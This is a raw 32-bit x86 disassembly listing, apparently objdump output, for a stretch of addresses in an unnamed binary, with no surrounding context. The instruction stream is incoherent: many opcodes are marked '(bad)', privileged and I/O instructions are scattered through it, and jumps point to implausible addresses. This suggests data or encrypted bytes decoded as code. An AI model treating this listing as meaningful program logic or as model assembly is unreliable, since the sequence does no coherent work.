  41edbc:	dec    eax
  41edbd:	mov    WORD PTR [ecx-0x2],ss
  41edc0:	(bad)  
  41edc1:	cwde   
  41edc2:	int3   
  41edc3:	sbb    bl,BYTE PTR [edx+0x7e]
  41edc6:	cs jg  0x41edba
  41edc9:	push   edi
  41edca:	punpcklwd mm2,DWORD PTR [eax+0x5e2fc021]
  41edd1:	and    al,0x6f
  41edd3:	test   DWORD PTR [esp+ebp*4-0x36eab84b],esp
  41edda:	outs   dx,DWORD PTR ds:[esi]
  41eddb:	or     eax,0x5c890817
  41ede0:	ret    
  41ede1:	out    dx,eax
  41ede2:	cld    
  41ede3:	fsubr  DWORD PTR [eax]
  41ede5:	cwde   
  41ede6:	lods   eax,DWORD PTR ds:[esi]
  41ede7:	mov    eax,ecx
  41ede9:	add    BYTE PTR [eax+edx*2],0xf
  41eded:	jmp    0x41ee6c
  41edef:	les    ecx,FWORD PTR [edi-0x51b30200]
  41edf5:	add    eax,DWORD PTR [eax+0x15]
  41edf8:	mov    ebx,0x6952eba4
  41edfd:	int    0x15
  41edff:	mov    bh,0xd
  41ee01:	mov    ds:0x2c5e55a9,al
  41ee06:	stc    
  41ee07:	add    esp,edi
  41ee09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee0a:	jns    0x41ee7c
  41ee0c:	lods   al,BYTE PTR ds:[esi]
  41ee0d:	xlat   BYTE PTR ds:[ebx]
  41ee0e:	jne    0x41ee42
  41ee10:	mov    bl,0xf9
  41ee12:	fbstp  TBYTE PTR fs:[ebp+0x17]
  41ee16:	sub    BYTE PTR [esi],ah
  41ee18:	ret    
  41ee19:	test   edx,ecx
  41ee1b:	fwait
  41ee1c:	sub    eax,0xafab04da
  41ee21:	sbb    BYTE PTR [eax-0x80],bh
  41ee24:	xchg   esi,eax
  41ee25:	lods   eax,DWORD PTR ds:[esi]
  41ee26:	fucom  st(5)
  41ee28:	(bad)  
  41ee29:	ins    BYTE PTR es:[edi],dx
  41ee2a:	dec    ebx
  41ee2b:	out    dx,eax
  41ee2c:	and    edx,DWORD PTR [eax-0x6a00add6]
  41ee32:	push   ds
  41ee33:	mov    BYTE PTR [edx+0x6512e673],cl
  41ee39:	adc    eax,eax
  41ee3b:	xlat   BYTE PTR ds:[ebx]
  41ee3c:	mov    ebp,0x895921f2
  41ee41:	iret   
  41ee42:	adc    BYTE PTR [esi+eiz*8+0x11],dl
  41ee46:	cmovs  esi,DWORD PTR [ebp+0x3f7f69fc]
  41ee4d:	and    BYTE PTR [ecx+0x27],al
  41ee50:	jp     0x41ee33
  41ee52:	push   ebx
  41ee53:	(bad)  
  41ee54:	push   ecx
  41ee55:	sub    esi,DWORD PTR [esp+eiz*4]
  41ee58:	dec    edx
  41ee59:	out    dx,al
  41ee5a:	add    eax,0xf8593700
  41ee5f:	scas   al,BYTE PTR es:[edi]
  41ee60:	or     eax,0x28ffa927
  41ee65:	fwait
  41ee66:	mov    dh,0x75
  41ee68:	mov    esi,0xb4dd6f4d
  41ee6d:	mov    ds:0x45d028c8,eax
  41ee72:	mov    ch,0x30
  41ee74:	xchg   al,cl
  41ee76:	(bad)  
  41ee77:	xlat   BYTE PTR ds:[ebx]
  41ee78:	repz es ret 
  41ee7b:	sub    DWORD PTR [esi],0x1cdc4d5b
  41ee81:	jp     0x41ee17
  41ee83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee84:	push   0x50
  41ee86:	js     0x41eed5
  41ee88:	push   edi
  41ee89:	rol    DWORD PTR [esi+0x6c],1
  41ee8c:	mov    dh,0x44
  41ee8e:	ins    DWORD PTR es:[edi],dx
  41ee8f:	push   ebp
  41ee90:	out    dx,al
  41ee91:	xchg   esi,eax
  41ee92:	stos   BYTE PTR es:[edi],al
  41ee93:	fnstenv ss:[ecx+0x66]
  41ee97:	lea    edi,[eax]
  41ee99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ee9a:	xchg   ebx,eax
  41ee9b:	pop    es
  41ee9c:	push   0x4
  41ee9e:	test   al,0xb
  41eea0:	popf   
  41eea1:	mov    bl,0x72
  41eea3:	mov    cl,0x45
  41eea5:	stos   DWORD PTR es:[edi],eax
  41eea6:	xchg   ecx,eax
  41eea7:	cli    
  41eea8:	aad    0xd8
  41eeaa:	jmp    0x44ceb193
  41eeaf:	mov    edi,0x4e0406d4
  41eeb4:	test   al,0x15
  41eeb6:	shl    DWORD PTR [edi+0x6a9bbdd4],cl
  41eebc:	inc    BYTE PTR [eax+ebp*2]
  41eebf:	add    al,0xf7
  41eec1:	xor    edx,DWORD PTR [esi]
  41eec3:	stos   DWORD PTR es:[edi],eax
  41eec4:	test   BYTE PTR [edx],0x3b
  41eec7:	xor    eax,0x2af87f8b
  41eecc:	cmp    ebx,DWORD PTR [ecx+0x6ec390a4]
  41eed2:	outs   dx,BYTE PTR ds:[esi]
  41eed3:	scas   al,BYTE PTR es:[edi]
  41eed4:	and    ebp,DWORD PTR [edi+esi*1]
  41eed7:	stos   DWORD PTR es:[edi],eax
  41eed8:	xor    DWORD PTR [eax+0x3481f618],ebp
  41eede:	ret    
  41eedf:	sub    eax,DWORD PTR [ebx-0x6420ddf2]
  41eee5:	fbstp  TBYTE PTR [ecx+ecx*1-0x6874ff41]
  41eeec:	(bad)  
  41eeed:	jb     0x41ef15
  41eeef:	lods   al,BYTE PTR ds:[esi]
  41eef0:	sbb    cl,ch
  41eef2:	or     dl,dl
  41eef4:	cmp    esp,DWORD PTR [eax]
  41eef6:	and    DWORD PTR [ebp-0x29],0x17
  41eefa:	js     0x41ef53
  41eefc:	mov    bl,0x43
  41eefe:	xchg   ebp,eax
  41eeff:	and    cl,BYTE PTR [edi]
  41ef01:	in     al,0x94
  41ef03:	or     DWORD PTR ds:0xe134241f,0x75185ab1
  41ef0d:	aas    
  41ef0e:	add    al,0xb9
  41ef10:	repnz in al,dx
  41ef12:	add    DWORD PTR [esp+edx*8+0x6f513d28],edx
  41ef19:	jno    0x41eee1
  41ef1b:	inc    eax
  41ef1c:	(bad)  
  41ef1e:	push   0x57
  41ef20:	cmp    al,0xf8
  41ef22:	aas    
  41ef23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef24:	je     0x41ef66
  41ef26:	and    eax,0xc2b8b570
  41ef2b:	xchg   DWORD PTR [esi*1+0x4df4ce7c],eax
  41ef32:	shl    BYTE PTR [ecx+ebp*4+0x67],1
  41ef36:	xchg   DWORD PTR ds:0xd01e49aa,ebp
  41ef3c:	ret    0x429b
  41ef3f:	cmc    
  41ef40:	xchg   BYTE PTR [ecx],al
  41ef42:	sbb    al,0x5d
  41ef44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef45:	enter  0x7e8f,0x58
  41ef49:	repnz fldenv [edx]
  41ef4c:	sbb    bl,bh
  41ef4e:	inc    ecx
  41ef4f:	push   es
  41ef50:	push   ebx
  41ef51:	ins    DWORD PTR es:[edi],dx
  41ef52:	fld    DWORD PTR [ebx+0x33cd5a2b]
  41ef58:	(bad)  
  41ef59:	stc    
  41ef5a:	shr    DWORD PTR [eax-0x52ac9baa],1
  41ef60:	or     ah,bh
  41ef62:	mov    ecx,0x66753e88
  41ef67:	push   cs
  41ef68:	sti    
  41ef69:	sar    DWORD PTR [eax+edx*4-0x63],cl
  41ef6d:	data16 fucomi st,st(7)
  41ef70:	fs dec esp
  41ef72:	jg     0x41ef98
  41ef74:	add    al,0xa
  41ef76:	push   0x66f2855
  41ef7b:	push   ebx
  41ef7c:	fs jmp 0xa488257d
  41ef82:	xor    eax,0xbced998a
  41ef87:	sar    BYTE PTR [eax+0x26],0x3
  41ef8b:	dec    ebx
  41ef8c:	(bad)  
  41ef8d:	inc    DWORD PTR [ebp-0x63]
  41ef90:	cmp    eax,DWORD PTR [ecx-0x40]
  41ef93:	jmp    0x6475e4d7
  41ef98:	les    eax,FWORD PTR [eax+esi*1-0x81f71ba]
  41ef9f:	fldl2e 
  41efa1:	sahf   
  41efa2:	sbb    cl,BYTE PTR [edi+0x76]
  41efa5:	pop    ebp
  41efa6:	add    DWORD PTR [edx-0x23],0x5
  41efaa:	jge    0x41f016
  41efac:	btc    DWORD PTR [edi+0x71d4058a],ecx
  41efb3:	icebp  
  41efb4:	xchg   ecx,eax
  41efb5:	jge    0x41efc4
  41efb7:	repnz (bad) 
  41efb9:	sbb    al,0x11
  41efbb:	mov    al,0x76
  41efbd:	and    cl,al
  41efbf:	inc    edx
  41efc0:	retf   
  41efc1:	cld    
  41efc2:	adc    DWORD PTR [eax],esp
  41efc4:	cmp    bh,BYTE PTR [esi]
  41efc6:	or     eax,0xcc8d3b2f
  41efcb:	out    0xd8,eax
  41efcd:	mov    ds:0xf95ee57,al
  41efd2:	sub    eax,0x80e6b626
  41efd7:	jl     0x41effe
  41efd9:	and    cl,BYTE PTR [edx]
  41efdb:	cld    
  41efdc:	adc    dl,BYTE PTR [esi-0x22]
  41efdf:	repz adc eax,0x845447d5
  41efe5:	mov    es,WORD PTR [ecx+0x39]
  41efe8:	jecxz  0x41ef6b
  41efea:	inc    eax
  41efeb:	sub    cl,BYTE PTR [eax+0x68693576]
  41eff1:	adc    edi,0x2d
  41eff4:	or     eax,0xfc3af773
  41eff9:	ror    cl,0xa6
  41effc:	adc    al,0xe8
  41effe:	hlt    
  41efff:	jg     0x41f058
  41f001:	loopne 0x41ef86
  41f003:	cmp    BYTE PTR [ecx],dl
  41f005:	fsubp  st(6),st
  41f007:	sbb    DWORD PTR [ecx],esp
  41f009:	scas   eax,DWORD PTR es:[edi]
  41f00a:	push   esp
  41f00b:	sbb    ebx,DWORD PTR [ecx]
  41f00d:	pop    ebx
  41f00e:	ins    DWORD PTR es:[edi],dx
  41f00f:	into   
  41f010:	pop    ds
  41f011:	xor    edi,DWORD PTR [edx]
  41f013:	mov    cl,0x2a
  41f015:	and    esi,edx
  41f017:	jno    0x41f02a
  41f019:	fmul   DWORD PTR fs:[ecx+0x633ec2d2]
  41f021:	mov    bh,0x9e
  41f023:	ret    0x34a6
  41f026:	mov    eax,0x8dc1a171
  41f02b:	das    
  41f02c:	fwait
  41f02d:	icebp  
  41f02e:	(bad)  
  41f02f:	mov    dh,0xbc
  41f031:	pop    es
  41f032:	in     eax,0x14
  41f034:	adc    BYTE PTR ds:0x57ca4681,al
  41f03a:	inc    esp
  41f03b:	cmc    
  41f03c:	or     ebx,DWORD PTR [ebp-0x80]
  41f03f:	shl    BYTE PTR [edi+ecx*2],0xb5
  41f043:	std    
  41f044:	aam    0xca
  41f046:	pop    esi
  41f047:	sub    BYTE PTR [esp+edi*4],bh
  41f04a:	mov    ebp,0x9038e008
  41f04f:	imul   ebp,DWORD PTR [ebx+0x5410b6d2],0x54
  41f056:	js     0x41f0cd
  41f058:	or     dh,BYTE PTR [esi-0x76]
  41f05b:	mov    ecx,0xf6ba7964
  41f060:	ss test bl,al
  41f063:	stc    
  41f064:	push   eax
  41f065:	xchg   BYTE PTR [edx],ch
  41f067:	pop    ecx
  41f068:	mov    bl,0xbe
  41f06a:	dec    esi
  41f06b:	idiv   BYTE PTR ds:0x69098489
  41f071:	mov    eax,0x2223d8e5
  41f076:	pop    ebx
  41f077:	imul   ebp,DWORD PTR [edi-0x5f],0x7c7320ef
  41f07e:	(bad)  
  41f07f:	out    0x11,al
  41f081:	in     al,dx
  41f082:	and    al,0xe8
  41f084:	push   esi
  41f085:	and    DWORD PTR [esi+0x1063fa76],edx
  41f08b:	fwait
  41f08c:	std    
  41f08d:	mov    ebx,DWORD PTR [ebp+0x74]
  41f090:	mov    eax,ds:0x1f6e8b80
  41f095:	arpl   WORD PTR [edi+0x365aa377],dx
  41f09b:	pop    ebx
  41f09c:	stc    
  41f09d:	test   DWORD PTR [edi-0x54ec8674],edx
  41f0a3:	or     ah,BYTE PTR [ebp-0x335bcad7]
  41f0a9:	push   ds
  41f0aa:	pusha  
  41f0ab:	inc    ebx
  41f0ac:	mov    bh,0xe5
  41f0ae:	mov    esi,0xa0d6f5f3
  41f0b3:	xchg   ecx,eax
  41f0b4:	or     eax,0xa778bb38
  41f0b9:	aaa    
  41f0ba:	test   DWORD PTR [ebx-0x43],ebx
  41f0bd:	out    0x84,al
  41f0bf:	jmp    0x41f106
  41f0c1:	fnsave [ecx+0x41de1068]
  41f0c7:	pop    esp
  41f0c8:	pop    ebp
  41f0c9:	jmp    0xa380:0x55b8f5a5
  41f0d0:	retf   0x23a7
  41f0d3:	popf   
  41f0d4:	lods   al,BYTE PTR ds:[esi]
  41f0d5:	in     al,0x3a
  41f0d7:	bound  ebx,QWORD PTR [ebp-0xb67d526]
  41f0dd:	into   
  41f0de:	lahf   
  41f0df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f0e0:	lods   al,BYTE PTR ds:[esi]
  41f0e1:	cmp    al,0xe
  41f0e3:	mov    dl,0xb8
  41f0e5:	mov    al,0xfb
  41f0e7:	push   ss
  41f0e8:	mov    eax,ds:0xcaef3a21
  41f0ed:	rcr    dh,1
  41f0ef:	ss adc ah,0xe
  41f0f3:	out    dx,eax
  41f0f4:	lock push cs
  41f0f6:	dec    edi
  41f0f7:	test   BYTE PTR [eax-0x65],ch
  41f0fa:	stos   DWORD PTR es:[edi],eax
  41f0fb:	call   0x175e7a27
  41f100:	mov    WORD PTR [esi],gs
  41f102:	into   
  41f103:	mov    ecx,0x6226b407
  41f108:	jb     0x41f0f3
  41f10a:	or     ebx,DWORD PTR cs:[edx-0x5120fd59]
  41f111:	popa   
  41f112:	push   ds
  41f113:	imul   esi,esp,0x54b3e263
  41f119:	popa   
  41f11a:	xchg   edi,eax
  41f11b:	ret    0xb1fe
  41f11e:	loopne 0x41f10f
  41f120:	cmp    eax,DWORD PTR [esp+ebp*2-0xf25ea59]
  41f127:	fdiv   QWORD PTR [esi+0x3ac3ffd5]
  41f12d:	xor    ebp,ebp
  41f12f:	or     al,0xd2
  41f131:	dec    ebx
  41f132:	jge    0x41f186
  41f134:	push   0x11544179
  41f139:	mov    cl,cl
  41f13b:	mov    cl,0xe5
  41f13d:	in     eax,dx
  41f13e:	cmc    
  41f13f:	test   DWORD PTR [ebx+0x46984a2d],esi
  41f145:	stos   BYTE PTR es:[edi],al
  41f146:	out    0x30,al
  41f148:	jp     0x41f1a3
  41f14a:	cdq    
  41f14b:	call   0x68f0:0xdd24e8c0
  41f152:	hlt    
  41f153:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f154:	sbb    eax,0x54d96639
  41f159:	sti    
  41f15a:	fist   DWORD PTR [ecx]
  41f15c:	es stc 
  41f15e:	not    BYTE PTR [ebx+0x6731708f]
  41f164:	sbb    ebp,DWORD PTR [eax]
  41f166:	pusha  
  41f167:	cld    
  41f168:	(bad)  
  41f16a:	adc    ecx,ecx
  41f16c:	or     al,0x22
  41f16e:	cmp    DWORD PTR [edi-0x5c],esp
  41f171:	pop    ds
  41f172:	mov    cl,0x2b
  41f174:	mov    ecx,0x6e79737e
  41f179:	xchg   ebx,eax
  41f17a:	jmp    0xfe8b:0x28182041
  41f181:	in     al,dx
  41f182:	and    eax,0xaf9c8585
  41f187:	add    DWORD PTR [edi+ecx*1-0x6f952467],edi
  41f18e:	xor    DWORD PTR ds:0x20268521,edi
  41f194:	sub    bh,BYTE PTR [eax-0x29]
  41f197:	out    0xf1,al
  41f199:	shl    BYTE PTR ds:0x2a0f9e87,cl
  41f19f:	aam    0x43
  41f1a1:	add    al,0xca
  41f1a3:	xor    edx,ebx
  41f1a5:	repnz cli 
  41f1a7:	dec    ebp
  41f1a8:	mov    gs,WORD PTR [eax+ebx*1+0x74]
  41f1ac:	stos   BYTE PTR es:[edi],al
  41f1ad:	mov    dl,0x74
  41f1af:	xchg   esp,eax
  41f1b0:	add    edx,ebx
  41f1b2:	inc    DWORD PTR [edx]
  41f1b4:	cwde   
  41f1b5:	ret    
  41f1b6:	add    DWORD PTR [eax],esp
  41f1b8:	jae    0x41f1ef
  41f1ba:	and    al,0xef
  41f1bc:	fidivr WORD PTR [edx-0x5ad16f84]
  41f1c2:	lea    edx,[edx-0x26a45e8e]
  41f1c8:	push   DWORD PTR fs:[esi]
  41f1cb:	adc    al,0xbf
  41f1cd:	in     eax,dx
  41f1ce:	ds inc esp
  41f1d0:	xor    eax,0x5b1eee92
  41f1d5:	test   DWORD PTR [ebp+eiz*8-0x76d491c4],ebp
  41f1dc:	nop
  41f1dd:	lods   eax,DWORD PTR ds:[esi]
  41f1de:	xor    eax,0xc5377c31
  41f1e3:	pop    eax
  41f1e4:	fcom   st(5)
  41f1e6:	push   ebp
  41f1e7:	ficomp DWORD PTR [ebx]
  41f1e9:	mov    ah,0x2
  41f1eb:	xor    ebx,esi
  41f1ed:	cmp    bh,BYTE PTR [edx+0x63]
  41f1f0:	xchg   ebx,eax
  41f1f1:	fadd   DWORD PTR [ecx+0xcca94ae]
  41f1f7:	clc    
  41f1f8:	shl    DWORD PTR [esi],cl
  41f1fa:	adc    DWORD PTR [ebp-0x39],edx
  41f1fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f1fe:	xlat   BYTE PTR ds:[ebx]
  41f1ff:	repz sub al,0xf7
  41f202:	test   dl,0xa3
  41f205:	push   ss
  41f206:	retf   0xfd05
  41f209:	stos   BYTE PTR es:[edi],al
  41f20a:	imul   esi,DWORD PTR [edi],0x4a
  41f20d:	fucomip st,st(4)
  41f20f:	stos   DWORD PTR es:[edi],eax
  41f210:	loop   0x41f1f0
  41f212:	adc    dh,bl
  41f214:	test   eax,0x479e8d7a
  41f219:	mov    cr4,edx
  41f21c:	rcl    DWORD PTR [edi-0x9],cl
  41f21f:	popf   
  41f220:	aam    0x7c
  41f222:	mov    edx,0xc01c716a
  41f227:	mov    bl,0x9f
  41f229:	imul   esp,DWORD PTR [edx-0x775fefe6],0x39dd22d8
  41f233:	call   0xa141a3af
  41f238:	add    ebp,DWORD PTR ss:[ebx+0x6e758bb9]
  41f23f:	push   edx
  41f240:	sbb    eax,0x64cad26a
  41f245:	scas   al,BYTE PTR es:[edi]
  41f246:	cwde   
  41f247:	enter  0x4317,0x23
  41f24b:	mov    al,fs:0xd57f4512
  41f251:	add    cl,BYTE PTR [ebp+0x32]
  41f254:	ds push esp
  41f256:	mov    ebx,0xaea6dd31
  41f25b:	jnp    0x41f2c9
  41f25d:	inc    edx
  41f25e:	jmp    0x41f1ee
  41f260:	int    0xcd
  41f262:	inc    ecx
  41f263:	fld    DWORD PTR [ebx-0x308d7842]
  41f269:	mov    esi,0xe9e872c9
  41f26e:	aaa    
  41f26f:	pop    esi
  41f270:	inc    ecx
  41f271:	outs   dx,DWORD PTR ds:[esi]
  41f272:	inc    esp
  41f273:	jge    0x41f22d
  41f275:	adc    dl,dh
  41f277:	test   BYTE PTR [esi+0x54],dh
  41f27a:	daa    
  41f27b:	inc    edx
  41f27c:	int3   
  41f27d:	pop    ds
  41f27e:	push   ecx
  41f27f:	shr    DWORD PTR [eax+ecx*2+0x756f67e6],1
  41f286:	ja     0x41f25b
  41f288:	rcr    DWORD PTR [edi+0x53],cl
  41f28b:	or     DWORD PTR ds:0x207f0775,0x4f007fae
  41f295:	push   esi
  41f296:	int3   
  41f297:	rcr    DWORD PTR [ebp+0x5a3729c0],0x77
  41f29e:	push   ss
  41f29f:	test   al,0xfd
  41f2a1:	dec    edi
  41f2a2:	std    
  41f2a3:	test   eax,0xdfef8ffb
  41f2a8:	xchg   ebx,eax
  41f2a9:	mov    eax,0x8232a54d
  41f2ae:	xchg   edi,eax
  41f2af:	aas    
  41f2b0:	loop   0x41f2f5
  41f2b2:	dec    ebp
  41f2b3:	cmp    eax,0x50e8bdb7
  41f2b8:	shr    dl,1
  41f2ba:	test   ebp,esi
  41f2bc:	(bad)  
  41f2bd:	jbe    0x41f2ac
  41f2bf:	in     eax,dx
  41f2c0:	ret    
  41f2c1:	push   edi
  41f2c2:	add    eax,edx
  41f2c4:	stos   DWORD PTR es:[edi],eax
  41f2c5:	mov    ch,0x88
  41f2c7:	imul   ebp,DWORD PTR [edx+0x69],0x98dd4222
  41f2ce:	sar    DWORD PTR [edx-0x5b108e2e],cl
  41f2d4:	xchg   esp,eax
  41f2d5:	or     bh,0x2c
  41f2d8:	push   esp
  41f2d9:	mov    ds:0xfdfb0d0d,al
  41f2de:	and    DWORD PTR [ecx+0x6786ff4c],esi
  41f2e4:	retf   
  41f2e5:	add    al,0x3d
  41f2e7:	dec    eax
  41f2e8:	xor    eax,0x73a6525d
  41f2ed:	jae    0x41f284
  41f2ef:	in     al,dx
  41f2f0:	xor    DWORD PTR [ecx-0x3be0099a],ebx
  41f2f6:	jp     0x41f2bf
  41f2f8:	mov    dh,0x9e
  41f2fa:	out    dx,al
  41f2fb:	jl     0x41f31f
  41f2fd:	rol    esp,cl
  41f2ff:	not    BYTE PTR [esi+0x8d00fcf]
  41f305:	stos   BYTE PTR es:[edi],al
  41f306:	fisubr DWORD PTR [edi]
  41f308:	xor    al,0xe7
  41f30a:	fwait
  41f30b:	xchg   ebx,eax
  41f30c:	mul    DWORD PTR [ebp-0x4]
  41f30f:	stos   DWORD PTR es:[edi],eax
  41f310:	pop    es
  41f311:	mov    esp,DWORD PTR [eax-0x9]
  41f314:	(bad)  
  41f315:	xchg   ebp,eax
  41f316:	adc    eax,0xccc8daed
  41f31b:	push   cs
  41f31c:	xchg   esp,eax
  41f31d:	dec    edi
  41f31e:	xchg   edi,eax
  41f31f:	adc    ch,BYTE PTR [edx]
  41f321:	jnp    0x41f32e
  41f323:	xchg   WORD PTR [ebx+0x45],cx
  41f327:	mov    al,ds:0xe0ec562b
  41f32c:	aaa    
  41f32d:	lds    edx,FWORD PTR [esi+0xd]
  41f330:	outs   dx,DWORD PTR ds:[esi]
  41f331:	(bad)  
  41f333:	jne    0x41f2f4
  41f335:	out    dx,eax
  41f336:	fcomp  DWORD PTR [esi+edi*8]
  41f339:	cmp    al,0xd9
  41f33b:	mov    eax,ds:0x26488150
  41f340:	sbb    DWORD PTR [eax+0x6e],edi
  41f343:	mov    cs,WORD PTR [edx+0x40dc5b75]
  41f349:	adc    BYTE PTR [eax+eiz*2-0x37a2377c],ch
  41f350:	cli    
  41f351:	test   al,0x88
  41f353:	fs inc esp
  41f355:	or     ebp,DWORD PTR [ebp-0x42]
  41f358:	(bad)  
  41f359:	fcmovnbe st,st(1)
  41f35b:	mov    WORD PTR [eax-0x6bfdc78a],es
  41f361:	rcl    ecx,cl
  41f363:	loop   0x41f3da
  41f365:	mov    dh,0x6b
  41f367:	ss cld 
  41f369:	push   eax
  41f36a:	jp     0x41f310
  41f36c:	jecxz  0x41f394
  41f36e:	add    ecx,DWORD PTR ss:[ebp+0x63]
  41f372:	test   al,0xe2
  41f374:	cmp    dl,cl
  41f376:	mov    ch,0xa0
  41f378:	mov    ebp,0xefe42dc3
  41f37d:	enter  0x555a,0xbc
  41f381:	out    dx,eax
  41f382:	addr16 mov bl,0x40
  41f385:	mov    ecx,0x988ecdd2
  41f38a:	inc    ebp
  41f38b:	rol    DWORD PTR [eax+0x2a],1
  41f38e:	sub    bl,BYTE PTR [ecx+eax*4]
  41f391:	xchg   edx,eax
  41f392:	inc    esi
  41f393:	cdq    
  41f394:	retf   0x9e19
  41f397:	add    ah,BYTE PTR [ecx+0x507e9142]
  41f39d:	and    eax,DWORD PTR [edx]
  41f39f:	clc    
  41f3a0:	test   BYTE PTR [edx-0x18],cl
  41f3a3:	idiv   DWORD PTR [ebp-0x5f]
  41f3a6:	and    DWORD PTR ds:0x1f32d652,esp
  41f3ac:	mov    dh,0x80
  41f3ae:	jns    0x41f360
  41f3b0:	(bad)  [edi-0x2530da29]
  41f3b6:	(bad)  
  41f3b7:	retf   
  41f3b8:	ret    
  41f3b9:	cmp    DWORD PTR [esi+0x69f582c],edi
  41f3bf:	shl    DWORD PTR [ebx-0x80],cl
  41f3c2:	cwde   
  41f3c3:	inc    edi
  41f3c4:	and    BYTE PTR ds:0x11114699,ch
  41f3ca:	mov    ds:0x5cfa1009,eax
  41f3cf:	push   0x47
  41f3d1:	popf   
  41f3d2:	and    BYTE PTR [ebp+edi*8+0x68],dh
  41f3d6:	cmp    DWORD PTR [ebx-0x166b86b0],0x7833b54d
  41f3e0:	outs   dx,DWORD PTR ds:[esi]
  41f3e1:	add    BYTE PTR ds:0xf2956c02,ah
  41f3e7:	aas    
  41f3e8:	or     al,0x4b
  41f3ea:	lea    esi,[eax-0x3b]
  41f3ed:	lahf   
  41f3ee:	pop    ss
  41f3ef:	dec    ebp
  41f3f0:	out    0x32,al
  41f3f2:	pop    ebx
  41f3f3:	and    bl,BYTE PTR [ebx]
  41f3f5:	cs jae 0x41f44c
  41f3f8:	mov    eax,0x11baa52c
  41f3fd:	jge    0x41f44e
  41f3ff:	pop    ecx
  41f400:	cli    
  41f401:	and    BYTE PTR [edx+edi*8-0x1a],dl
  41f405:	in     eax,0x19
  41f407:	mov    edi,0xea1abc8b
  41f40c:	sahf   
  41f40d:	cli    
  41f40e:	and    ebx,DWORD PTR [edx+0x7955f478]
  41f414:	and    BYTE PTR [ebx-0x7e7b6c72],dl
  41f41a:	fnstcw WORD PTR [ecx+0x5f]
  41f41d:	inc    esp
  41f41e:	add    BYTE PTR [edi-0x319a2a3e],dl
  41f424:	stc    
  41f425:	add    ah,ch
  41f427:	ret    0x2b19
  41f42a:	cmp    bh,dl
  41f42c:	in     al,0x23
  41f42e:	jmp    0xc752dfc1
  41f433:	rol    al,0xdf
  41f436:	push   0xffffffcb
  41f438:	ds mov ecx,0xc5f42cd4
  41f43e:	hlt    
  41f43f:	push   eax
  41f440:	(bad)  
  41f441:	mov    gs,ebp
  41f443:	xchg   ebp,eax
  41f444:	push   ecx
  41f445:	sub    dl,BYTE PTR [esi-0x11cb1991]
  41f44b:	out    dx,eax
  41f44c:	mov    bh,0x65
  41f44e:	and    eax,0xc1d20ea9
  41f453:	retf   
  41f454:	sub    ecx,DWORD PTR [edx-0x18]
  41f457:	and    eax,0xda65fd30
  41f45c:	stos   DWORD PTR es:[edi],eax
  41f45d:	shr    BYTE PTR [edx+eiz*4],1
  41f460:	ret    
  41f461:	xchg   edi,eax
  41f462:	es loopne 0x41f4a6
  41f465:	cs pop ebp
  41f467:	lods   al,BYTE PTR ds:[esi]
  41f468:	lahf   
  41f469:	stos   BYTE PTR es:[edi],al
  41f46a:	sub    eax,0x205bc6eb
  41f46f:	call   0x6d41:0x19375549
  41f476:	ret    0x64ad
  41f479:	ret    0x3bad
  41f47c:	jle    0x41f434
  41f47e:	push   0x61
  41f480:	je     0x41f438
  41f482:	push   edx
  41f483:	clc    
  41f484:	pop    edx
  41f485:	sar    BYTE PTR [edi+ebx*1],0x27
  41f489:	sbb    al,ch
  41f48b:	sub    al,0xc3
  41f48d:	outs   dx,BYTE PTR ds:[esi]
  41f48e:	outs   dx,BYTE PTR ds:[esi]
  41f48f:	out    0x2d,al
  41f491:	xchg   edi,eax
  41f492:	cmp    edx,ecx
  41f494:	push   ds
  41f495:	aam    0x56
  41f497:	repnz das 
  41f499:	out    0x40,eax
  41f49b:	(bad)  
  41f49c:	jl     0x41f4df
  41f49e:	dec    ebx
  41f49f:	(bad)  
  41f4a0:	gs jae 0x41f50e
  41f4a3:	daa    
  41f4a4:	arpl   dx,bx
  41f4a6:	xor    BYTE PTR [edi+eax*8+0x63b44918],bl
  41f4ad:	test   al,0x3e
  41f4af:	push   ss
  41f4b0:	mov    ch,BYTE PTR [edi]
  41f4b2:	or     al,0x1a
  41f4b4:	je     0x41f528
  41f4b6:	mov    ds:0x31aa63e6,eax
  41f4bb:	push   esp
  41f4bc:	mov    esp,0x44d44b6f
  41f4c1:	sti    
  41f4c2:	add    ch,cl
  41f4c4:	xchg   BYTE PTR [esi+0x3c],bh
  41f4c7:	lods   eax,DWORD PTR ds:[esi]
  41f4c8:	push   ss
  41f4c9:	out    dx,eax
  41f4ca:	js     0x27f83eaa
  41f4d0:	adc    al,BYTE PTR [ebx-0x1]
  41f4d3:	int3   
  41f4d4:	xchg   ecx,eax
  41f4d5:	cmp    al,0x29
  41f4d7:	nop
  41f4d8:	add    cl,BYTE PTR [eax+ecx*4]
  41f4db:	pop    esi
  41f4dc:	or     dh,BYTE PTR ds:0x442a232a
  41f4e2:	stos   DWORD PTR es:[edi],eax
  41f4e3:	loop   0x41f50e
  41f4e5:	jmp    0x38d8faf3
  41f4ea:	mov    DWORD PTR [edi-0x7e],edi
  41f4ed:	loop   0x41f56e
  41f4ef:	fistp  DWORD PTR [ebx-0x5ce1b006]
  41f4f5:	cmp    DWORD PTR [ebx+edi*2+0xe2022dc],eax
  41f4fc:	popa   
  41f4fd:	test   BYTE PTR [ebx-0x38a200e4],ah
  41f503:	outs   dx,BYTE PTR ds:[esi]
  41f504:	xchg   edx,eax
  41f505:	aam    0x46
  41f507:	dec    eax
  41f508:	adc    al,0x63
  41f50a:	jmp    0xe993d2ff
  41f50f:	cdq    
  41f510:	ror    DWORD PTR [ebp-0x75720795],0x80
  41f517:	les    ebx,FWORD PTR [esi+0x3714ced0]
  41f51d:	mov    esp,0xaec9148
  41f522:	daa    
  41f523:	jb     0x41f545
  41f525:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f526:	cdq    
  41f527:	div    BYTE PTR [esi+0x6c97002f]
  41f52d:	(bad)  
  41f52e:	xor    bh,BYTE PTR [eax]
  41f530:	xlat   BYTE PTR ds:[ebx]
  41f531:	and    ch,BYTE PTR [esi-0x1e7c58b5]
  41f537:	mov    bl,0xf9
  41f539:	in     al,0xfe
  41f53b:	jmp    0x190c2c95
  41f540:	shr    BYTE PTR [eax+0x2e64aaaf],cl
